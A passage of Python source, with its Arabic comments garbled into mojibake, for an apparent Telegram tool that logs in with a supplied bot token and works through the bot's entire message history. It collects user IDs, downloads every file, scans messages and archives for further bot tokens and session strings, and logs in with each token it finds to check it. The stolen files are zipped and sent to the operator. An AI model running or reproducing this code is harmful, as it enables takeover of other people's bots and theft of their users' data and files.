            "INSERT OR REPLACE INTO token_cache (token, validation_data) VALUES (?, ?)",
            (token, json.dumps(validation_data))
        )
        await db.commit()

async def get_cached_users(bot_token):
    """Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            "SELECT user_data FROM user_cache WHERE bot_token = ? AND created_at > datetime('now', '-72 hours')",
            (bot_token,)
        )
        result = await cursor.fetchone()
        return json.loads(result[0]) if result else None

async def set_cached_users(bot_token, user_data):
    """ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ø§Ù„Ù…Ø¤Ù‚ØªØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR REPLACE INTO user_cache (bot_token, user_data) VALUES (?, ?)",
            (bot_token, json.dumps(user_data))
        )
        await db.commit()

# Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø£Ø®Ø·Ø§Ø¡ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
async def with_db_retry(func, max_retries=5, delay=1):
    """ØªÙ†ÙÙŠØ° Ø¯Ø§Ù„Ø© Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø­Ø¯ÙˆØ« Ø£Ø®Ø·Ø§Ø¡ ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    for attempt in range(max_retries):
        try:
            return await func()
        except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                print(f"âš ï¸ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù‚ÙÙ„Ø©ØŒ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© {attempt + 1}/{max_retries}")
                await asyncio.sleep(delay * (attempt + 1))
            else:
                raise e
        except Exception as e:
            raise e

# Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
async def with_telegram_retry(func, max_retries=12, delay=2):  # Ø¬Ø¹Ù„ 12 Ø§ÙØªØ±Ø§Ø¶ÙŠØ§Ù‹
    """ØªÙ†ÙÙŠØ° Ø¯Ø§Ù„Ø© Ù…Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø­Ø¯ÙˆØ« Ø£Ø®Ø·Ø§Ø¡ ÙÙŠ ØªÙ„ÙŠØ¬Ø±Ø§Ù…"""
    for attempt in range(max_retries):
        try:
            return await func()
        except RpcCallFailError as e:
            if "internal issues" in str(e).lower() and attempt < max_retries - 1:
                print(f"âš ï¸ ØªÙ„ÙŠØ¬Ø±Ø§Ù… ÙŠÙˆØ§Ø¬Ù‡ Ù…Ø´Ø§ÙƒÙ„ Ø¯Ø§Ø®Ù„ÙŠØ©ØŒ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© {attempt + 1}/{max_retries}")
                await asyncio.sleep(delay * (attempt + 1))
            else:
                raise e
        except FloodWaitError as e:
            wait_time = e.seconds
            print(f"â³ Ø§Ù†ØªØ¸Ø± {wait_time} Ø«Ø§Ù†ÙŠØ© Ø¨Ø³Ø¨Ø¨ FloodWait")
            await asyncio.sleep(wait_time + 1)
            if attempt < max_retries - 1:
                continue
            else:
                raise e
        except Exception as e:
            raise e

def cleanup_sessions():
    try:
        for old_session in glob.glob(os.path.join(SESSION_DIR, '*.session*')):
            try:
                # Ø­Ø°Ù ÙÙ‚Ø· Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© (Ø£Ù‚Ø¯Ù… Ù…Ù† Ø³Ø§Ø¹Ø©)
                if time.time() - os.path.getmtime(old_session) > 3600:
                    os.remove(old_session)
            except OSError:
                pass
    except Exception as e:
        print(f"Warning: Could not clean up sessions: {e}")

async def forward_message(bot, message, target_id):
    try:
        await with_telegram_retry(lambda: bot.forward_messages(
            entity=int(target_id),
            messages=message.id,
            from_peer=message.peer_id
        ))
        return True
    except Exception as e:
        print(f"Error forwarding message: {e}")
        return False

async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=None, stop_event=None):
    total_messages = end_id - start_id + 1
    current_id = start_id
    success_count = 0
    failed_count = 0
    last_update_time = 0
    
    while current_id <= end_id and (stop_event is None or not stop_event.is_set()):
        try:
            messages = await with_telegram_retry(lambda: bot(GetMessagesRequest([x for x in range(current_id, min(current_id + 100, end_id + 1))])))
            for m in messages.messages:
                if stop_event and stop_event.is_set():
                    break
                    
                if isinstance(m, MessageEmpty):
                    continue
                if await forward_message(bot, m, target_id):
                    success_count += 1
                else:
                    failed_count += 1
                
                current_time = time.time()
                if progress_callback and (current_time - last_update_time >= 5 or success_count + failed_count == total_messages):
                    last_update_time = current_time
                    if not await progress_callback(success_count + failed_count, total_messages):
                        break
                    
                await asyncio.sleep(SEND_DELAY)
            current_id += 100
        except Exception as e:
            print(f"Error processing messages {current_id}-{current_id+100}: {e}")
            failed_count += 100
            current_id += 100
            continue

    return success_count, failed_count

async def find_max_message_id(bot):
    try:
        left = 1
        right = 100000
        last_valid = 1

        while left <= right:
            mid = (left + right) // 2
            try:
                message = await with_telegram_retry(lambda: bot(GetMessagesRequest([mid])))
                if message.messages and not isinstance(message.messages[0], MessageEmpty):
                    last_valid = mid
                    left = mid + 1
                else:
                    right = mid - 1
            except Exception as e:
                print(f"Error checking message {mid}: {e}")
                right = mid - 1

        return last_valid
    except Exception as e:
        print(f"Error finding max message id: {e}")
        return 0

async def analyze_bot(bot_token, user_id, progress_callback=None):
    """ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø¨Ø³Ø±Ø¹Ø© ÙØ§Ø¦Ù‚Ø© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
    try:
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ø£ÙˆÙ„Ø§Ù‹
        cache_key = f"analysis_{bot_token}"
        cached_analysis = await get_cached_analysis(cache_key)
        if cached_analysis:
            print(f"ğŸ“¦ Using cached analysis for bot: {bot_token[:15]}...")
            return cached_analysis
            
        temp_session = os.path.join(SESSION_DIR, f"analyze_bot_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        me = await temp_bot.get_me()
        bot_username = me.username
        
        # Ø¥ÙŠØ¬Ø§Ø¯ Ø£Ù‚ØµÙ‰ Ù…Ø¹Ø±Ù Ø±Ø³Ø§Ù„Ø©
        max_id = await find_max_message_id(temp_bot)
        
        stats = {
            'total_messages': max_id,
            'users': set(),
            'files': [],
            'photos': [],
            'tokens': {'total': 0, 'valid': 0, 'details': []},
            'sessions': {'total': 0, 'details': []}
        }

        seen_tokens = set()
        seen_sessions = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø¹Ù…Ù„ Ø¥Ù„Ù‰ Ù…Ù‡Ø§Ù… Ù…ØªÙˆØ§Ø²ÙŠØ©
        tasks = []
        chunk_size = 100
        
        for i in range(1, max_id + 1, chunk_size):
            end_range = min(i + chunk_size, max_id + 1)
            tasks.append(process_message_chunk(temp_bot, i, end_range, stats, seen_tokens, seen_sessions))
        
        # ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ Ù…Ø¹ ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
        total_chunks = len(tasks)
        completed_chunks = 0
        
        for i, task in enumerate(asyncio.as_completed(tasks)):
            try:
                await task
                completed_chunks += 1
                
                if progress_callback:
                    progress_percent = (completed_chunks / total_chunks) * 100
                    if not await progress_callback(completed_chunks * chunk_size, max_id, progress_percent):
                        break
            except Exception as e:
                print(f"Error in chunk processing: {e}")
                continue
        
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        if stats['tokens']['details']:
            await validate_tokens_parallel(stats['tokens']['details'])
            stats['tokens']['valid'] = sum(1 for token in stats['tokens']['details'] if token['valid'])
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        # ØªØ­ÙˆÙŠÙ„ set Ø¥Ù„Ù‰ list Ù„Ù„ØªØ®Ø²ÙŠÙ† ÙÙŠ JSON
        result = {
            'success': True,
            'bot_username': bot_username,
            'total_messages': stats['total_messages'],
            'total_users': len(stats['users']),
            'total_files': len(stats['files']),
            'total_photos': len(stats['photos']),
            'files': stats['files'],
            'photos': stats['photos'],
            'tokens': stats['tokens'],
            'sessions': stats['sessions'],
            'user_ids': list(stats['users'])  # ØªØ­ÙˆÙŠÙ„ set Ø¥Ù„Ù‰ list
        }
        
        # ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†ØªÙŠØ¬Ø© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        await set_cached_analysis(cache_key, result)
        return result
        
    except Exception as e:
        print(f"Error analyzing bot: {e}")
        return {'success': False, 'error': str(e)}


async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_sessions):
    """Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¨Ø´ÙƒÙ„ Ù…Ù†ÙØµÙ„"""
    try:
        message_ids = list(range(start_id, end_id))
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)), max_retries=12)
        
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            
            # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
            if hasattr(msg, 'from_id') and msg.from_id:
                user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                stats['users'].add(user_id_str)
            
            if hasattr(msg, 'reply_to') and msg.reply_to:
                if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                    reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                    stats['users'].add(reply_user_id)
            
            if hasattr(msg, 'peer_id'):
                if hasattr(msg.peer_id, 'user_id'):
                    stats['users'].add(str(msg.peer_id.user_id))
                elif hasattr(msg.peer_id, 'chat_id'):
                    stats['users'].add(str(msg.peer_id.chat_id))
                elif hasattr(msg.peer_id, 'channel_id'):
                    stats['users'].add(str(msg.peer_id.channel_id))
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙˆØ³Ø§Ø¦Ø·
            if hasattr(msg, 'media'):
                if isinstance(msg.media, MessageMediaDocument):
                    if hasattr(msg.media, 'document') and isinstance(msg.media.document, Document):
                        document = msg.media.document
                        
                        # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø£ØµÙ„ÙŠ
                        original_name = f"file_{document.id}"
                        file_extension = "bin"
                        
                        # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù ÙÙŠ attributes
                        for attr in document.attributes:
                            if isinstance(attr, DocumentAttributeFilename):
                                original_name = attr.file_name
                                # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø§Ù…ØªØ¯Ø§Ø¯
                                if '.' in original_name:
                                    file_extension = original_name.split('.')[-1]
                                break
                        
                        stats['files'].append({
                            'id': document.id,
                            'access_hash': document.access_hash,
                            'file_reference': document.file_reference,
                            'original_name': original_name,
                            'file_extension': file_extension,
                            'name': original_name
                        })
                        
                        # ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„Ù ÙˆØªØ­Ù„ÙŠÙ„Ù‡ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
                        try:
                            file_data = await download_with_retry(bot, InputDocumentFileLocation(
                                id=document.id,
                                access_hash=document.access_hash,
                                file_reference=document.file_reference,
                                thumb_size=''
                            ), max_retries=12)  # Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù‡Ù†Ø§ Ø£ÙŠØ¶Ø§Ù‹
                            if file_data:
                                text_data = file_data.decode(errors="ignore")
                                
                                # ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª
                                for token in TOKEN_PATTERN.findall(text_data):
                                    if token not in seen_tokens:
                                        seen_tokens.add(token)
                                        stats['tokens']['total'] += 1
                                        stats['tokens']['details'].append({
                                            'token': token,
                                            'valid': False,
                                            'bot_info': {}
                                        })
                                
                                # ÙØ­Øµ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª
                                for session in SESSION_PATTERN_CHAT.findall(text_data):
                                    if session not in seen_sessions:
                                        seen_sessions.add(session)
                                        stats['sessions']['total'] += 1
                                        stats['sessions']['details'].append({
                                            'session': session,
                                            'source': 'file'
                                        })
                                
                                # ÙØ­Øµ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                try:
                                    with zipfile.ZipFile(io.BytesIO(file_data)) as z:
                                        for fname in z.namelist():
                                            if fname.lower().endswith((".txt", ".json", ".py", ".php", ".js", ".html", ".xml")):
                                                try:
                                                    content = z.read(fname).decode(errors="ignore")
                                                    # ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                                    for token in TOKEN_PATTERN.findall(content):
                                                        if token not in seen_tokens:
                                                            seen_tokens.add(token)
                                                            stats['tokens']['total'] += 1
                                                            stats['tokens']['details'].append({
                                                                'token': token,
                                                                'valid': False,
                                                                'bot_info': {}
                                                            })
                                                    # ÙØ­Øµ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¶ØºÙˆØ·Ø©
                                                    for session in SESSION_PATTERN_CHAT.findall(content):
                                                        if session not in seen_sessions:
                                                            seen_sessions.add(session)
                                                            stats['sessions']['total'] += 1
                                                            stats['sessions']['details'].append({
                                                                'session': session,
                                                                'source': 'zip'
                                                            })
                                                except:
                                                    continue
                                except:
                                    # Ù„ÙŠØ³ Ù…Ù„Ù Ù…Ø¶ØºÙˆØ·ØŒ ØªØ®Ø·ÙŠ
                                    pass
                        except Exception as e:
                            # Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØŒ ØªØ®Ø·ÙŠ
                            pass
                            
                elif isinstance(msg.media, MessageMediaPhoto):
                    if hasattr(msg.media, 'photo') and isinstance(msg.media.photo, Photo):
                        photo = msg.media.photo
                        stats['photos'].append({
                            'id': photo.id,
                            'access_hash': photo.access_hash,
                            'file_reference': photo.file_reference,
                            'original_name': f"photo_{photo.id}.jpg",
                            'file_extension': "jpg",
                            'name': f"photo_{photo.id}.jpg"
                        })
            
            # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù†Øµ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                
                token_matches = TOKEN_PATTERN.findall(text)
                for token in token_matches:
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        stats['tokens']['total'] += 1
                        stats['tokens']['details'].append({
                            'token': token,
                            'valid': False,
                            'bot_info': {}
                        })
                
                session_matches = SESSION_PATTERN_CHAT.findall(text)
                for session in session_matches:
                    if session not in seen_sessions:
                        seen_sessions.add(session)
                        stats['sessions']['total'] += 1
                        stats['sessions']['details'].append({
                            'session': session,
                            'source': 'chat'
                        })
    
    except Exception as e:
        print(f"Error processing chunk {start_id}-{end_id}: {e}")

async def validate_tokens_parallel(tokens_list, max_concurrent=20):
    """Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ Ù…Ø¹ ØªØ­Ø¯ÙŠØ¯ Ø­Ø¯ Ø§Ù„ØªØ²Ø§Ù…Ù†"""
    # Ø¥Ù†Ø´Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø§Ù„Ù…Ù‡Ø§Ù…
    tasks = []
    
    # ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØªÙŠ ØªØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚
    tokens_to_validate = [token_info for token_info in tokens_list if not token_info.get('processed', False)]
    
    # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¥Ù„Ù‰ Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ù„ØªØ¬Ù†Ø¨ Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²Ø§Ø¦Ø¯
    for i in range(0, len(tokens_to_validate), max_concurrent):
        chunk = tokens_to_validate[i:i + max_concurrent]
        
        # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù‡Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù„ÙƒÙ„ Ù…Ø¬Ù…ÙˆØ¹Ø©
        chunk_tasks = [validate_token(token_info['token']) for token_info in chunk]
        
        # ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        chunk_results = await asyncio.gather(*chunk_tasks, return_exceptions=True)
        
        # ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„ÙƒÙ„ ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©
        for j, result in enumerate(chunk_results):
            token_index = i + j
            if token_index < len(tokens_to_validate):
                if isinstance(result, Exception):
                    print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ†: {result}")
                    tokens_to_validate[token_index]['valid'] = False
                    tokens_to_validate[token_index]['bot_info'] = {'error': str(result)}
                else:
                    tokens_to_validate[token_index]['valid'] = result.get('valid', False)
                    tokens_to_validate[token_index]['bot_info'] = result
                    tokens_to_validate[token_index]['processed'] = True

async def validate_token(token):
    """Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª"""
    try:
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ø£ÙˆÙ„Ø§Ù‹
        cached_token = await get_cached_token(token)
        if cached_token:
            return cached_token
            
        temp_session = os.path.join(SESSION_DIR, f"validate_token_{int(time.time())}_{hash(token)}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=token)
        
        me = await temp_bot.get_me()
        bot_info = await temp_bot(GetFullUserRequest(me.id))
        
        # Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£Ù‚ØµÙ‰ Ù…Ø¹Ø±Ù Ø±Ø³Ø§Ù„Ø©
        max_id = await find_max_message_id(temp_bot)
        users = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¥Ù„Ù‰ Ù…Ø¬Ù…ÙˆØ¹Ø§Øª Ù„Ù„ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…ØªÙˆØ§Ø²ÙŠ
        batch_size = 300
        tasks = []
        
        async def process_batch(start, end):
            local_users = set()
            try:
                message_ids = list(range(start, end))
                messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)))
                for msg in messages.messages:
                    if isinstance(msg, MessageEmpty):
                        continue
                    
                    # Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                    if hasattr(msg, 'from_id') and msg.from_id:
                        user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                        local_users.add(user_id_str)
                    
                    if hasattr(msg, 'reply_to') and msg.reply_to:
                        if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                            reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                            local_users.add(reply_user_id)
                    
                    if hasattr(msg, 'peer_id'):
                        if hasattr(msg.peer_id, 'user_id'):
                            local_users.add(str(msg.peer_id.user_id))
                        elif hasattr(msg.peer_id, 'chat_id'):
                            local_users.add(str(msg.peer_id.chat_id))
                        elif hasattr(msg.peer_id, 'channel_id'):
                            local_users.add(str(msg.peer_id.channel_id))
            except Exception as e:
                print(f"Error processing messages {start}-{end}: {e}")
            return local_users
        
        # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù‡Ø§Ù… Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¯ÙÙØ¹Ø§Øª
        for i in range(1, max_id + 1, batch_size):
            end_range = min(i + batch_size, max_id + 1)
            tasks.append(process_batch(i, end_range))
        
        # ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Ø¯Ù…Ø¬ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        for r in results:
            if isinstance(r, set):
                users.update(r)
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        result = {
            'valid': True,
            'bot_name': me.first_name,
            'bot_username': me.username,
            'bot_id': me.id,
            'total_messages': max_id,
            'total_users': len(users)
        }
        
        # ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†ØªÙŠØ¬Ø© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        await set_cached_token(token, result)
        return result
        
    except Exception as e:
        result = {'valid': False, 'error': str(e)}
        await set_cached_token(token, result)
        return result

async def download_with_retry(bot, file_location, max_retries=3):
    for attempt in range(max_retries):
        try:
            file_data = await bot.download_file(file_location, bytes)
            if file_data:
                return file_data
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            await asyncio.sleep(1)
    return None

async def download_and_add_to_zip(bot, file_info, zip_file, file_type):
    try:
        if file_type == 'document':
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )
        else:
            file_location = InputDocumentFileLocation(
                id=file_info['id'],
                access_hash=file_info['access_hash'],
                file_reference=file_info['file_reference'],
                thumb_size=''
            )
        
        file_data = await download_with_retry(bot, file_location)
        if file_data:
            # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ø³Ù… Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø£ØµÙ„ÙŠ Ø¥Ø°Ø§ Ù…ÙˆØ¬ÙˆØ¯
            original_name = file_info.get('original_name', '')
            if not original_name:
                # Ø¥Ø°Ø§ Ù…Ø§ÙÙŠØ´ Ø§Ø³Ù… Ø£ØµÙ„ÙŠØŒ Ù†Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„Ø§Ù…ØªØ¯Ø§Ø¯
                file_extension = file_info.get('file_extension', '')
                if not file_extension:
                    file_extension = 'bin'  # Ø§ÙØªØ±Ø§Ø¶ÙŠ Ø¥Ø°Ø§ Ù…Ø§ÙÙŠØ´ Ø§Ù…ØªØ¯Ø§Ø¯
                original_name = f"file_{file_info['id']}.{file_extension}"
            
            # Ù…Ù†Ø¹ ØªÙƒØ±Ø§Ø± Ø§Ù„Ø£Ø³Ù…Ø§Ø¡ ÙÙŠ Ø§Ù„Ø²ÙŠØ¨
            file_name = original_name
            counter = 1
            while file_name in zip_file.namelist():
                name_parts = original_name.rsplit('.', 1)
                if len(name_parts) > 1:
                    base_name, extension = name_parts
                    file_name = f"{base_name}_{counter}.{extension}"
                else:
                    file_name = f"{original_name}_{counter}"
                counter += 1
            
            zip_file.writestr(file_name, file_data)
            return True
            
    except Exception as e:
        if "file reference has expired" in str(e).lower():
            print(f"âš ï¸ ØªØ®Ø·ÙŠ Ø§Ù„Ù…Ù„Ù {file_info['id']} - Ø§Ù„Ù…Ø±Ø¬Ø¹ Ù…Ù†ØªÙ‡ÙŠ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©")
            return False
        else:
            print(f"âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ {file_type} {file_info['id']}: {e}")
    return False

async def send_zip_files(main_bot, source_bot, file_infos, zip_name, caption, user_id, file_type):
    try:
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_info in file_infos:
                if await download_and_add_to_zip(source_bot, file_info, zip_file, file_type):
                    success_count += 1
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"{caption} ({success_count} Ù…Ù„ÙØ§Øª)",
                attributes=[DocumentAttributeFilename(f"{zip_name}.zip")]
            )
            return True
        else:
            return False
    except Exception as e:
        print(f"Error sending zip file: {e}")
        return False

async def extract_users_from_bot(bot_token, user_id):
    try:
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø¤Ù‚Øª Ø£ÙˆÙ„Ø§Ù‹
        cached_users = await get_cached_users(bot_token)
        if cached_users:
            return cached_users
            
        temp_session = os.path.join(SESSION_DIR, f"extract_users_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        users = set()
        max_id = await find_max_message_id(temp_bot)
        
        batch_size = 200
        for i in range(1, max_id + 1, batch_size):
            try:
                end_range = min(i + batch_size, max_id + 1)
                message_ids = list(range(i, end_range))
                messages = await with_telegram_retry(lambda: temp_bot(GetMessagesRequest(message_ids)))
                
                for msg in messages.messages:
                    if isinstance(msg, MessageEmpty):
                        continue
                    
